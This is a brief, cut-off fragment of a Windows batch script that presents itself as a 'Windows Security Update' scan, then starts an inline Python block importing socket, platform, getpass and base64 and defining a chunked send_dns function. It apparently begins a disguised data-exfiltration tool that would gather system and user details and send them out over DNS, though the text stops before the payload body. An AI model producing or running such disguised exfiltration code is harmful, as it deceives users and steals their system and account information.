@echo off
title Windows Security Update
echo Running security scan...

python -c "
import socket, platform, getpass, base64, time

def send_dns(data, chunk_id):